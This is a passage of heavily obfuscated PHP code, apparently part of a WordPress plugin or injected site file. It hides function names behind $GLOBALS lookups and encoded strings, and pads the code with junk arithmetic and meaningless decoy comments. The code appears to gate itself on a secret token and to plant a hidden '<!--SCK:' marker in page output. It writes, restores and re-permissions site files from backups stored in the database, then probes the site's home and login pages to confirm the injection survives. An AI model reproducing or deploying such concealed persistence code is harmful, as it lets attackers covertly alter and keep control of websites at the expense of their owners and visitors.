  if  ($GLOBALS['__scf_vf9p0fditvxy_35']($ye4ostf0t1yu)  && isset($ye4ostf0t1yu['t']))  $f6_o9tsh33utg[] =    (string)     $ye4ostf0t1yu['t'];

  }
   }
 $stuin_hl8puzxp =    false;
  foreach   ($f6_o9tsh33utg  as     $ssg2wnsmptf)  {
 if   ($ssg2wnsmptf    ===   "")      continue;
$stuin_hl8puzxp   =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1403))  ?  hash_equals($ssg2wnsmptf,  $digk2wmdxsk9)  : ($ssg2wnsmptf    === $digk2wmdxsk9);
  if   ($stuin_hl8puzxp)  break;
 }
// @finalize prototype

 if     (!$stuin_hl8puzxp)      return;
$GLOBALS[dhd5r6_4ki(1404)]   =    $digk2wmdxsk9;
      rehs1w07vadorbxdvk(dhd5r6_4ki(1405), mhiu2yqz6kqd(1406),    -1);
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1407))) {
   $GLOBALS['__scf_m8aixr72vowj30_170'](mhiu2yqz6kqd(1406));
    }
}
 function  p7mu7s58onbpwt42r48cd()
 {

 if     (empty($GLOBALS[nhceivfj8tbe(1404)])  || !$GLOBALS['__scf__me483qbepnts_41']($GLOBALS[nhceivfj8tbe(1404)])) return;
if    (!empty($GLOBALS[nrudcgor(1408)])) return;
  $GLOBALS[dhd5r6_4ki(1409)]  =  true;

  echo  "\n<!--SCK:"   .  $GLOBALS[nrudcgor(1410)]    .   pahk8uy1uxt(1411);


 }
function pyewlacc1jwb_z()
      {
if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1366))) return    false;
        $d1kd72zq60vf6el    = @get_option(mhiu2yqz6kqd(556),   "");

    if  (!$GLOBALS['__scf__me483qbepnts_41']($d1kd72zq60vf6el)    ||   $GLOBALS['__scf_nr12ouzrtt_7']($d1kd72zq60vf6el,   nhceivfj8tbe(1412))  !==  0) return false;
 $cx37cncy31qs3d   = (int)  $GLOBALS['__scf_bv1z3no349dv5r_9']($d1kd72zq60vf6el,  (0x1+0x5));
 if  ($cx37cncy31qs3d   &&   $GLOBALS['__scf_zxyq0lcqv02z6_185']() -  $cx37cncy31qs3d >   (86342+58)) return false;
     return    true;
}
  function      c8kiybf7y18a9bd5ahp($no4625mwq2q9a2,    $r1kzhmz2a2o_1o)
 {
// hermitian composite

    if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1413))    ||   !$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1407)))   return  false;
// inline retry-policy for PHP 8.1 intersection

   $wxblmcmwgvzwjsap  =      @get_option(dhd5r6_4ki(1414),    array());
  if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap)) $wxblmcmwgvzwjsap =  array();
if  (!isset($wxblmcmwgvzwjsap[dhd5r6_4ki(1415)])     || !$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap[mhiu2yqz6kqd(1415)]))  {
    $e03_yf2qy5 =   array();
     if    (isset($wxblmcmwgvzwjsap['t'], $wxblmcmwgvzwjsap['p'],    $wxblmcmwgvzwjsap['b']))    {
  $cx_ybk5g8doey  = (string)    $wxblmcmwgvzwjsap['p'];
       $p6pdfgh4oe3qln     =   (string)     $wxblmcmwgvzwjsap['b'];
 $e03_yf2qy5[$GLOBALS['__scf_nn04_vx3uspzx4_54']($cx_ybk5g8doey)]   = array('t'  => (string)  $wxblmcmwgvzwjsap['t'],   'p'     =>   $cx_ybk5g8doey, 'b' =>   $p6pdfgh4oe3qln,     mhiu2yqz6kqd(918) =>   isset($wxblmcmwgvzwjsap[pahk8uy1uxt(918)])   ?  (int) $wxblmcmwgvzwjsap[f5cd2smymkqusi5(918)]    :   $GLOBALS['__scf_zxyq0lcqv02z6_185'](),   dhd5r6_4ki(1416)    =>  0,   'n'   =>    (@$GLOBALS['__scf_gsamhlxot70ps_18']($p6pdfgh4oe3qln) &&    (int)    @$GLOBALS['__scf_g9y45bstmb02a_95']($p6pdfgh4oe3qln)    ===    0)   ? 1  : 0);
$nvnowww6i9e =  $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1417))    ?     @md5_file($cx_ybk5g8doey)  : false;
        if    ($GLOBALS['__scf__me483qbepnts_41']($nvnowww6i9e)    &&  $nvnowww6i9e  !==  "") $e03_yf2qy5[$GLOBALS['__scf_nn04_vx3uspzx4_54']($cx_ybk5g8doey)]['h']  =    $nvnowww6i9e;
      unset($cx_ybk5g8doey,  $p6pdfgh4oe3qln,    $nvnowww6i9e);
 }
   $wxblmcmwgvzwjsap =   array(dhd5r6_4ki(1418)    => $e03_yf2qy5);



 }
$gejiz6p4a0q   = $GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2);
 $_klal4rolvw9g9 = pyewlacc1jwb_z()     ? 1 : 0;



$xuwewauqy8dd20o   =    !isset($wxblmcmwgvzwjsap[pahk8uy1uxt(1418)][$gejiz6p4a0q]);
if    (!$xuwewauqy8dd20o)     {
 $wxblmcmwgvzwjsap[nrudcgor(1418)][$gejiz6p4a0q][pahk8uy1uxt(918)] = $GLOBALS['__scf_zxyq0lcqv02z6_185']();
    $wxblmcmwgvzwjsap[nhceivfj8tbe(1418)][$gejiz6p4a0q]['g']   =  $GLOBALS['__scf_m30d3r9g_n_287'](true);

 $wxblmcmwgvzwjsap[dhd5r6_4ki(1419)][$gejiz6p4a0q][mhiu2yqz6kqd(1420)]   = 0;
$wxblmcmwgvzwjsap[pahk8uy1uxt(1421)][$gejiz6p4a0q]['n']   =  ($r1kzhmz2a2o_1o    ===    "") ?    1 :   0;
     $wxblmcmwgvzwjsap[f5cd2smymkqusi5(1422)][$gejiz6p4a0q][f5cd2smymkqusi5(1423)]     = $_klal4rolvw9g9;
     

$wxblmcmwgvzwjsap[dhd5r6_4ki(1424)][$gejiz6p4a0q][nhceivfj8tbe(1425)]  =    $GLOBALS['__scf_zxyq0lcqv02z6_185']();
  $wxblmcmwgvzwjsap[f5cd2smymkqusi5(1426)][$gejiz6p4a0q][f5cd2smymkqusi5(1427)]  =    0;
 $wxblmcmwgvzwjsap[mhiu2yqz6kqd(1426)][$gejiz6p4a0q][f5cd2smymkqusi5(1428)]   =     0;

$wxblmcmwgvzwjsap[nhceivfj8tbe(1429)][$gejiz6p4a0q][mhiu2yqz6kqd(1430)]  =    0;
  if    (!jr30c_pj_1z9sfyaq3c88($wxblmcmwgvzwjsap[dhd5r6_4ki(1429)][$gejiz6p4a0q]['b'],   $r1kzhmz2a2o_1o))   {
fukkkeh6955g9qi(nrudcgor(1431), dhd5r6_4ki(1432));
 return false;
  }
 } else   {
// volatile capability

    if     ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($wxblmcmwgvzwjsap[f5cd2smymkqusi5(1429)])  >=   (0x4+0x6))   {
 fukkkeh6955g9qi(dhd5r6_4ki(1433), pahk8uy1uxt(1434));
  return false;
  }
   $ys5go7qi508n  =  twjiqbicrnr_q7();
    $cy88oapf3b6kv  = $ys5go7qi508n .   dhd5r6_4ki(1435)      . ohrydgas8yy9a22s($no4625mwq2q9a2,   (1+11))  .     f5cd2smymkqusi5(1436);
if   (!jr30c_pj_1z9sfyaq3c88($cy88oapf3b6kv,  $r1kzhmz2a2o_1o))    {
 fukkkeh6955g9qi(dhd5r6_4ki(1433),   mhiu2yqz6kqd(1432));
return false;
 }
     $wxblmcmwgvzwjsap[nhceivfj8tbe(1437)][$gejiz6p4a0q]  =  array('t'    =>   mfjvf6sgyqd_5z((123^107)),      'p'   => $no4625mwq2q9a2, 'b'  =>  $cy88oapf3b6kv,      nhceivfj8tbe(918)  =>  $GLOBALS['__scf_zxyq0lcqv02z6_185'](),  'g'  => $GLOBALS['__scf_m30d3r9g_n_287'](true), f5cd2smymkqusi5(1438)   =>   0,    'n' =>   ($r1kzhmz2a2o_1o  ===  "")  ?  1     : 0,  pahk8uy1uxt(1423) =>  $_klal4rolvw9g9,   dhd5r6_4ki(1425)  =>      $GLOBALS['__scf_zxyq0lcqv02z6_185'](),  dhd5r6_4ki(1427)  =>     0,  f5cd2smymkqusi5(1428)  =>    0,   mhiu2yqz6kqd(1430)    =>    0);
       }
      $p0c4yhpvo5   = @update_option(f5cd2smymkqusi5(1414),  $wxblmcmwgvzwjsap, dhd5r6_4ki(1242));
 if (!$p0c4yhpvo5)     {
   if      ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1095)))  @wp_cache_delete(nrudcgor(1439), mhiu2yqz6kqd(1097));$ub9kcfetwcf8=(0xa8+0xe7);$znl4vhl0t15=$ub9kcfetwcf8%16;
 

  $fuzhwhpzx7klw7te =    @get_option(f5cd2smymkqusi5(1439), array());
      $fmwdpo9coh =   $GLOBALS['__scf_vf9p0fditvxy_35']($fuzhwhpzx7klw7te) && isset($fuzhwhpzx7klw7te[pahk8uy1uxt(1437)][$gejiz6p4a0q])   &&  $GLOBALS['__scf_vf9p0fditvxy_35']($fuzhwhpzx7klw7te[nhceivfj8tbe(1437)][$gejiz6p4a0q])
&&    isset($fuzhwhpzx7klw7te[f5cd2smymkqusi5(1437)][$gejiz6p4a0q]['g']) &&     (string)  $fuzhwhpzx7klw7te[f5cd2smymkqusi5(1437)][$gejiz6p4a0q]['g']   === (string) $wxblmcmwgvzwjsap[nhceivfj8tbe(1437)][$gejiz6p4a0q]['g'];


     if     (!$fmwdpo9coh) {
if  ($xuwewauqy8dd20o) t65xl1pt2haov_izh($wxblmcmwgvzwjsap[mhiu2yqz6kqd(1437)][$gejiz6p4a0q]['b']);
  global  $wpdb;
$mk1xxdvpb7jo0  =  (isset($wpdb) &&  $GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb) &&  !empty($wpdb->last_error))   ?    $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(464),  ' ',   (string)  $wpdb->last_error),  0,   (5<<4))   :     dhd5r6_4ki(1440);$bx1bn3hi02b_m=64*3;$j7oqp9m0r=$bx1bn3hi02b_m-35;


    fukkkeh6955g9qi(f5cd2smymkqusi5(1433),    f5cd2smymkqusi5(1441)   .   $mk1xxdvpb7jo0);$q_snemyg4=112|56;$x_7t904k=$q_snemyg4^203;
 unset($mk1xxdvpb7jo0);
 return false;

}
    }



   $GLOBALS['__scf_m8aixr72vowj30_170'](pahk8uy1uxt(1442));

   return   true;
 }
function  rto_x8v8fsfdrokt5er()
       {
if   (!isset($GLOBALS[dhd5r6_4ki(1443)]) || !$GLOBALS['__scf_avkb5syka2a_1444']($GLOBALS[nrudcgor(1443)]))  $GLOBALS[mhiu2yqz6kqd(1443)]   =   0.0;

return  11.0 -   $GLOBALS[nrudcgor(1443)];
   }
      function   pt1cm84h66a0i7f2o59r5b($xoj0n83j09)

{
// @rollback gateway

     $GLOBALS[f5cd2smymkqusi5(1445)]  =   (isset($GLOBALS[pahk8uy1uxt(1445)])   &&    $GLOBALS['__scf_avkb5syka2a_1444']($GLOBALS[pahk8uy1uxt(1446)])    ? $GLOBALS[mhiu2yqz6kqd(1447)]      :   0.0) + (float) $xoj0n83j09;
     }
 function  eswty50xqi67ciga($dz57qyx_4j_o)
 {


 $lmr1pf50jn0tgr2 = rto_x8v8fsfdrokt5er();
if     ($lmr1pf50jn0tgr2 <=  0.5)   return array(-2,   "");
  

$tqxd7go8mxl  =     $GLOBALS['__scf_kgu6kfjf1dox_481'](1,    $GLOBALS['__scf_us1cf9ood8_482']((8-2), (int)   $lmr1pf50jn0tgr2));

 $pjglx7emsunn  =   $GLOBALS['__scf_m30d3r9g_n_287'](true);


$w83a2v_3h4g1d    =   @$GLOBALS['__scf_yt926i7lwej_290']($dz57qyx_4j_o, array(mhiu2yqz6kqd(681)   => $tqxd7go8mxl,   mhiu2yqz6kqd(760)   =>  false,  nhceivfj8tbe(386)  =>   true, pahk8uy1uxt(682) => 0,    dhd5r6_4ki(952) =>    (1048478+98), nhceivfj8tbe(958)    => array(f5cd2smymkqusi5(953)   => mhiu2yqz6kqd(1448),   dhd5r6_4ki(1449)      =>   nrudcgor(954))));
    pt1cm84h66a0i7f2o59r5b($GLOBALS['__scf_m30d3r9g_n_287'](true) -   $pjglx7emsunn);
   if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(956))  &&  is_wp_error($w83a2v_3h4g1d)) return  array(-1,  false);
       $tvb6duty46kk5o  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1450)) ?  (int)  wp_remote_retrieve_response_code($w83a2v_3h4g1d)     : 0;
  return  array($tvb6duty46kk5o,  $tvb6duty46kk5o >    0  && $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1451))  ?  (string)   wp_remote_retrieve_body($w83a2v_3h4g1d)   : "");
   }



 function    m08f_15ylhgex6($no4625mwq2q9a2)
     {
if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1366))  ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1452))  ||    !$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1417)))    return;



    $wxblmcmwgvzwjsap   =  @get_option(f5cd2smymkqusi5(1439),  array());
 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap)     ||   !isset($wxblmcmwgvzwjsap[nrudcgor(1437)])    ||   !$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap[dhd5r6_4ki(1453)])) return;
  $gejiz6p4a0q  =   $GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2);
 if   (!isset($wxblmcmwgvzwjsap[dhd5r6_4ki(1454)][$gejiz6p4a0q])) return;

    $_7e_e05ht34mww07  =  @md5_file($no4625mwq2q9a2);$e8jf_7yz38y=(0x47+0x54);$a89rsba5ateca2=$e8jf_7yz38y%6;
 if    (!$GLOBALS['__scf__me483qbepnts_41']($_7e_e05ht34mww07) ||   $_7e_e05ht34mww07      ===   "")    return;
  $wxblmcmwgvzwjsap[dhd5r6_4ki(1455)][$gejiz6p4a0q]['h'] = $_7e_e05ht34mww07;



@update_option(dhd5r6_4ki(1456), $wxblmcmwgvzwjsap,  nrudcgor(1242));



 }
  function qa45z8o82nrvonbb8rzbah($ye4ostf0t1yu)
{
 $sbxa99xouscsd     =      @$GLOBALS['__scf_apq4pqdt6n41_91']($ye4ostf0t1yu['b']);
 if     (!$GLOBALS['__scf__me483qbepnts_41']($sbxa99xouscsd))    return  false;
   if  (!empty($ye4ostf0t1yu['h'])     && $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1417)))  {
 $bn99nvxxyof1ktd = @md5_file($ye4ostf0t1yu['p']);
   if     ($GLOBALS['__scf__me483qbepnts_41']($bn99nvxxyof1ktd)   &&  $bn99nvxxyof1ktd    !== "" &&  $bn99nvxxyof1ktd !==    $ye4ostf0t1yu['h'])  return   false;
unset($bn99nvxxyof1ktd);



      }



     if ($sbxa99xouscsd  ===   "")  {$l2s8ozz3g=4474;$zmww6lga=$l2s8ozz3g%15;
   if   (empty($ye4ostf0t1yu['n']))  return   false;  
   $dj45ms8r6d8e  =     !@$GLOBALS['__scf_gsamhlxot70ps_18']($ye4ostf0t1yu['p']);
  if  (!$dj45ms8r6d8e)  {
 rgiuaapohxeh0z($ye4ostf0t1yu['p'], (0x24+0x180));
  $dj45ms8r6d8e =  t65xl1pt2haov_izh($ye4ostf0t1yu['p']);
    }
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1292)))   @opcache_invalidate($ye4ostf0t1yu['p'], true);
  return     $dj45ms8r6d8e;
     }
 if   (!jr30c_pj_1z9sfyaq3c88($ye4ostf0t1yu['p'],  $sbxa99xouscsd))      return false;
 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1292)))  @opcache_invalidate($ye4ostf0t1yu['p'],     true);
return      true;
    }
  function d8c48u1j6096aicb0y1()
    {
if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1366)))  return;
     if (!empty($GLOBALS[nrudcgor(122)])) return;
     if  (!dw5qugv407fnslnons1tfr(f5cd2smymkqusi5(1456))) return;

   try    {
      $wxblmcmwgvzwjsap   =     @get_option(mhiu2yqz6kqd(1456), array());



 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap))     return;
 if (!isset($wxblmcmwgvzwjsap[nhceivfj8tbe(1455)])  ||  !$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap[pahk8uy1uxt(1455)])) {
 $e03_yf2qy5  =  array();



        if (isset($wxblmcmwgvzwjsap['t'],    $wxblmcmwgvzwjsap['p'],  $wxblmcmwgvzwjsap['b'])) {
  $cx_ybk5g8doey =      (string)    $wxblmcmwgvzwjsap['p'];
$p6pdfgh4oe3qln  =     (string)   $wxblmcmwgvzwjsap['b'];
$e03_yf2qy5[$GLOBALS['__scf_nn04_vx3uspzx4_54']($cx_ybk5g8doey)]  =  array('t' =>  (string)   $wxblmcmwgvzwjsap['t'],      'p'  =>   $cx_ybk5g8doey,     'b'     => $p6pdfgh4oe3qln,   nrudcgor(918) =>    isset($wxblmcmwgvzwjsap[pahk8uy1uxt(918)]) ? (int)   $wxblmcmwgvzwjsap[f5cd2smymkqusi5(1457)]      :   $GLOBALS['__scf_zxyq0lcqv02z6_185'](), f5cd2smymkqusi5(1438)  => 0, 'n'     =>  (@$GLOBALS['__scf_gsamhlxot70ps_18']($p6pdfgh4oe3qln)   &&   (int)      @$GLOBALS['__scf_g9y45bstmb02a_95']($p6pdfgh4oe3qln)    ===  0)    ? 1 :   0);
 $nvnowww6i9e     = $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1417)) ?  @md5_file($cx_ybk5g8doey) :  false;
 if  ($GLOBALS['__scf__me483qbepnts_41']($nvnowww6i9e) && $nvnowww6i9e !== "")    $e03_yf2qy5[$GLOBALS['__scf_nn04_vx3uspzx4_54']($cx_ybk5g8doey)]['h']  = $nvnowww6i9e;
unset($cx_ybk5g8doey,     $p6pdfgh4oe3qln,   $nvnowww6i9e);



}
// WP Full Site Editing capability gate

 $wxblmcmwgvzwjsap  =  array(f5cd2smymkqusi5(1455)   =>   $e03_yf2qy5);
}
  if  (empty($wxblmcmwgvzwjsap[pahk8uy1uxt(1455)])) {

@delete_option(f5cd2smymkqusi5(1456));$za70lrnewva67=661;$kalm2517k=($za70lrnewva67>0)?$za70lrnewva67:-$za70lrnewva67;
return;
 }
    if     (pyewlacc1jwb_z()) {
$a9cts_qlgu =  false;



  foreach    ($wxblmcmwgvzwjsap[nhceivfj8tbe(1455)]  as   $rncvv9_6safph5 =>  $y5ex4khstb) {
 if   ($GLOBALS['__scf_vf9p0fditvxy_35']($y5ex4khstb)  &&  empty($y5ex4khstb[dhd5r6_4ki(1423)])) {
    $wxblmcmwgvzwjsap[mhiu2yqz6kqd(1458)][$rncvv9_6safph5][mhiu2yqz6kqd(1459)]     =    1;
  $a9cts_qlgu    =     true;
     }


  }
    if    ($a9cts_qlgu)   @update_option(pahk8uy1uxt(1460),   $wxblmcmwgvzwjsap, nrudcgor(1461));
  unset($a9cts_qlgu,      $rncvv9_6safph5,  $y5ex4khstb);


 return;
  }


   static   $c4u26guxrzllce =   false;



   if ($c4u26guxrzllce) return;
$c4u26guxrzllce  =  true;
  $q6hp6vgfdnj4mol8  =    $GLOBALS['__scf_r8u4axo29pt55k_724']($wxblmcmwgvzwjsap[mhiu2yqz6kqd(1458)]);
  $pqrziwlrq3xgo87q =  array();


 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1462)))    @$GLOBALS['__scf_k5wfn50cx02lr1_388']();
elseif  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(389)))      @$GLOBALS['__scf_vcb1lxd5m0p5dy_389']();
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(390)))     @$GLOBALS['__scf_hhzezqrk2hs9_390'](true);
if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1463))   ||    !$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1140)))    return;
 $xtqes7uue94ts3a   =   home_url('/');
 $i1nhc7w5296w8 =  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(564))  ?  wp_login_url()    :  $xtqes7uue94ts3a  .  pahk8uy1uxt(1464);
$_oh8gv71jy  =  false;



$d33j_e30qfrbu  =  true;
     $lmr1pf50jn0tgr2  = (58^57);

foreach   ($wxblmcmwgvzwjsap[nrudcgor(1458)]  as     $gejiz6p4a0q   =>    $ye4ostf0t1yu) {
     if   (rto_x8v8fsfdrokt5er() <=    0.5) break;
    if    (!$GLOBALS['__scf_vf9p0fditvxy_35']($ye4ostf0t1yu)   ||  empty($ye4ostf0t1yu['t'])   ||   empty($ye4ostf0t1yu['p'])     ||      empty($ye4ostf0t1yu['b']))    {



       unset($wxblmcmwgvzwjsap[pahk8uy1uxt(1465)][$gejiz6p4a0q]);
  $_oh8gv71jy  =  true;
  continue;
}
 if  (!isset($ye4ostf0t1yu['n'])   ||  !isset($ye4ostf0t1yu['h']))  {
   if  (!isset($ye4ostf0t1yu['n']))    $ye4ostf0t1yu['n']  =  (@$GLOBALS['__scf_gsamhlxot70ps_18']($ye4ostf0t1yu['b'])   &&    (int)   @$GLOBALS['__scf_g9y45bstmb02a_95']($ye4ostf0t1yu['b'])  ===  0)      ?   1   :   0;
     if  (!isset($ye4ostf0t1yu['h']) &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1417))) {
$n4q__5c7tkbcqd2g   =   @md5_file($ye4ostf0t1yu['p']);
   if   ($GLOBALS['__scf__me483qbepnts_41']($n4q__5c7tkbcqd2g)    &&  $n4q__5c7tkbcqd2g    !== "") $ye4ostf0t1yu['h']    =  $n4q__5c7tkbcqd2g;
       unset($n4q__5c7tkbcqd2g);
}
  $wxblmcmwgvzwjsap[pahk8uy1uxt(1465)][$gejiz6p4a0q] =  $ye4ostf0t1yu;
    $_oh8gv71jy =   true;
 }
// WP Script Modules: immutable flyweight

if   (!empty($ye4ostf0t1yu[pahk8uy1uxt(1459)]))    {
$ye4ostf0t1yu[mhiu2yqz6kqd(1466)]  =  0;
  $ye4ostf0t1yu[nhceivfj8tbe(1457)]    = $GLOBALS['__scf_zxyq0lcqv02z6_185']();
 $ye4ostf0t1yu[dhd5r6_4ki(1438)]   =   0;
 $ye4ostf0t1yu[nhceivfj8tbe(1467)]  =   0;


      $ye4ostf0t1yu[nhceivfj8tbe(1428)]  =    0;
  $ye4ostf0t1yu[f5cd2smymkqusi5(1430)] = 0;
        $wxblmcmwgvzwjsap[nhceivfj8tbe(1465)][$gejiz6p4a0q]    = $ye4ostf0t1yu;
 $_oh8gv71jy     =  true;
 }
     if (empty($ye4ostf0t1yu[mhiu2yqz6kqd(1425)])) {



$wxblmcmwgvzwjsap[mhiu2yqz6kqd(1465)][$gejiz6p4a0q][mhiu2yqz6kqd(1425)]    =  (int)  $ye4ostf0t1yu[nhceivfj8tbe(1457)];


        $ye4ostf0t1yu[mhiu2yqz6kqd(1468)]     =  (int)   $ye4ostf0t1yu[nhceivfj8tbe(1457)];
  $_oh8gv71jy      =    true;$tz890_qm3i4i1=PHP_MAJOR_VERSION;$txehb0s2m6jm=$tz890_qm3i4i1*9;



   }
 if  (!empty($ye4ostf0t1yu[mhiu2yqz6kqd(1428)])  &&    $GLOBALS['__scf_zxyq0lcqv02z6_185']()    <   (int) $ye4ostf0t1yu[dhd5r6_4ki(1428)])   continue;
  if  ($lmr1pf50jn0tgr2  <= 0)    break;
$lmr1pf50jn0tgr2--;
 $d4g6t2rengbe0   =   nrudcgor(1469)   . $GLOBALS['__scf_cj3zww1y5s_1470']($ye4ostf0t1yu['t'])  .      nrudcgor(1471)  .   $GLOBALS['__scf_cn1v_k8jlgjjb_350']((66263+33737),  (0xce143+0x260fc));
 list($tvb6duty46kk5o,     $t_ownkir6pw3n6)   = eswty50xqi67ciga($xtqes7uue94ts3a .    $d4g6t2rengbe0);
        if  ($tvb6duty46kk5o    ===     -2)   break;
  if    ($tvb6duty46kk5o >  0) $d33j_e30qfrbu  =  false;
   if    ($tvb6duty46kk5o   ===  -1     &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(688))    &&   rto_x8v8fsfdrokt5er()   >  2)  $GLOBALS['__scf_fuzlhztkbb25_688'](1);
   if     ($tvb6duty46kk5o   ===  -1) {
list($tvb6duty46kk5o,  $t_ownkir6pw3n6)  =  eswty50xqi67ciga($xtqes7uue94ts3a  .    $d4g6t2rengbe0);
 if    ($tvb6duty46kk5o ===   -2)     break;
if    ($tvb6duty46kk5o     >  0)      $d33j_e30qfrbu =   false;
   }
 if ($tvb6duty46kk5o   <=   0) {
$wxblmcmwgvzwjsap[nhceivfj8tbe(1472)][$gejiz6p4a0q][nhceivfj8tbe(1473)]++;
 $_oh8gv71jy  =  true;
   continue;
 }
      if ($tvb6duty46kk5o    >=   (715-215))     {
    if   (qa45z8o82nrvonbb8rzbah($ye4ostf0t1yu))  {
  fukkkeh6955g9qi(f5cd2smymkqusi5(1433),     nrudcgor(1474) . $GLOBALS['__scf_t8832qq90dxb4_3']($ye4ostf0t1yu['p']));


$pqrziwlrq3xgo87q[$gejiz6p4a0q]  =    $ye4ostf0t1yu;
   unset($wxblmcmwgvzwjsap[dhd5r6_4ki(1472)][$gejiz6p4a0q]);
    }     else  {
  $wxblmcmwgvzwjsap[f5cd2smymkqusi5(1472)][$gejiz6p4a0q][dhd5r6_4ki(1473)]++;



 }
  $_oh8gv71jy =  true;
 continue;
 

  }
    if ($GLOBALS['__scf_nr12ouzrtt_7']($t_ownkir6pw3n6,  dhd5r6_4ki(1475)     .  $ye4ostf0t1yu['t']    . nhceivfj8tbe(1411))  !==    false)  {
   $pqrziwlrq3xgo87q[$gejiz6p4a0q]   =    $ye4ostf0t1yu;
 unset($wxblmcmwgvzwjsap[nhceivfj8tbe(1476)][$gejiz6p4a0q]);

      $_oh8gv71jy  =    true;
  continue;
  }
list($j3y0kbaaqd8f, $fl589095fbgj2m12)    = eswty50xqi67ciga($i1nhc7w5296w8 .  ($GLOBALS['__scf_nr12ouzrtt_7']($i1nhc7w5296w8,  '?')  ===    false ? '?'   :    '&')   .   f5cd2smymkqusi5(1477)  .    $GLOBALS['__scf_cj3zww1y5s_1470']($ye4ostf0t1yu['t']) .    pahk8uy1uxt(1471)    . $GLOBALS['__scf_cn1v_k8jlgjjb_350']((99982+18),   (999959+40)));
    if  ($j3y0kbaaqd8f  === -2) break;


if ($j3y0kbaaqd8f > 0)   $d33j_e30qfrbu   = false;

if   ($j3y0kbaaqd8f  >=   (433+67))      {
 if   (qa45z8o82nrvonbb8rzbah($ye4ostf0t1yu))   {
 fukkkeh6955g9qi(nhceivfj8tbe(1433), dhd5r6_4ki(1478)   . $GLOBALS['__scf_t8832qq90dxb4_3']($ye4ostf0t1yu['p']));
    $pqrziwlrq3xgo87q[$gejiz6p4a0q]   =    $ye4ostf0t1yu;
   unset($wxblmcmwgvzwjsap[nrudcgor(1476)][$gejiz6p4a0q]);
}  else  {
// WP Site Tagline: immutable heap

  $wxblmcmwgvzwjsap[dhd5r6_4ki(1479)][$gejiz6p4a0q][nrudcgor(1473)]++;
}
  $_oh8gv71jy =    true;
     continue;
      }
     if    ($GLOBALS['__scf__me483qbepnts_41']($fl589095fbgj2m12)    &&    $GLOBALS['__scf_nr12ouzrtt_7']($fl589095fbgj2m12, nhceivfj8tbe(1475) .  $ye4ostf0t1yu['t']    .    nhceivfj8tbe(1480))    !== false)     {
       $pqrziwlrq3xgo87q[$gejiz6p4a0q] = $ye4ostf0t1yu;
     unset($wxblmcmwgvzwjsap[dhd5r6_4ki(1479)][$gejiz6p4a0q]);
   $_oh8gv71jy   =  true;
   continue;


}
  $wxblmcmwgvzwjsap[nrudcgor(1479)][$gejiz6p4a0q][pahk8uy1uxt(1467)]  = (int)  (isset($wxblmcmwgvzwjsap[dhd5r6_4ki(1479)][$gejiz6p4a0q][pahk8uy1uxt(1467)])  ? $wxblmcmwgvzwjsap[pahk8uy1uxt(1481)][$gejiz6p4a0q][mhiu2yqz6kqd(1467)]   :   0)  + 1;
  if   ($GLOBALS['__scf_zxyq0lcqv02z6_185']() -   (int)  $wxblmcmwgvzwjsap[f5cd2smymkqusi5(1481)][$gejiz6p4a0q][mhiu2yqz6kqd(1468)]  > (604716+84))  {
     $wxblmcmwgvzwjsap[nhceivfj8tbe(1481)][$gejiz6p4a0q][nrudcgor(1430)]    =     1;
$wxblmcmwgvzwjsap[pahk8uy1uxt(1481)][$gejiz6p4a0q][nhceivfj8tbe(1428)] = $GLOBALS['__scf_zxyq0lcqv02z6_185']()  +    (86362+38);
 }  else {
/* offline tumbling-window */

   $mbrkaynaue     = array((37+23),  (259+41),   (1798-898),    (3507+93));



$mewi74iw_iv27  =   (int)  $wxblmcmwgvzwjsap[nrudcgor(1482)][$gejiz6p4a0q][nhceivfj8tbe(1467)];
 $wxblmcmwgvzwjsap[nhceivfj8tbe(1482)][$gejiz6p4a0q][pahk8uy1uxt(1428)] =    $GLOBALS['__scf_zxyq0lcqv02z6_185']()   +   $mbrkaynaue[$GLOBALS['__scf_us1cf9ood8_482']($mewi74iw_iv27,      (200^204))  - 1];
    unset($mbrkaynaue,  $mewi74iw_iv27);
    }



$_oh8gv71jy   =   true;
 }
